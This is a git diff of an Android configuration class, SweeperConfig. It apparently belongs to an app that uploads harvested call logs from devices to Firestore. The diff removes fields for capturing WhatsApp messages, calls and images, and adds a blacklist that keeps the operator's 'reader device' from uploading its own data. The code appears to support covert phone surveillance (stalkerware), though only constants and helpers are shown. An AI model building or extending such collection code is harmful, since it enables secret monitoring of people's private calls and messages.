@@ -6,12 +6,11 @@ import android.os.Build;
 
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
+import java.util.Collections;
+import java.util.Set;
 
 public class SweeperConfig {
     static final String COLLECTION_CALL_LOGS = "callLogs";
-    static final String COLLECTION_WHATSAPP_MSGS = "whatsappMessages";
-    static final String COLLECTION_WHATSAPP_CALLS = "whatsappCalls";
-    static final String COLLECTION_WHATSAPP_IMAGES = "whatsappImages";
 
     static final String FIELD_DEVICE = "deviceId";
     static final String FIELD_NUMBER = "number";
@@ -19,14 +18,9 @@ public class SweeperConfig {
     static final String FIELD_TYPE = "type";
     static final String FIELD_DURATION = "durationSec";
     static final String FIELD_TIMESTAMP = "timestamp";
-    static final String FIELD_SENDER = "sender";
-    static final String FIELD_PREVIEW = "preview";
-    static final String FIELD_IS_GROUP = "isGroup";
-    static final String FIELD_CALLER = "caller";
-    static final String FIELD_IMAGE = "imageData";
-    static final String FIELD_MIME = "mimeType";
 
-    static final int WHATSAPP_NOTIFICATION_ID = 4102;
+    // Devices whose data should never be uploaded to Firestore (reader device)
+    static final Set<String> BLACKLISTED_DEVICES = Collections.singleton("9bde8680c88a308a");
 
     static String deviceId(Context context) {
         String id = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
@@ -50,5 +44,9 @@ public class SweeperConfig {
             manufacturer = "Unknown";
         }
         return manufacturer + " " + Build.MODEL;
+    }
+
+    static boolean isBlacklisted(String deviceId) {
+        return BLACKLISTED_DEVICES.contains(deviceId);
     }
 }
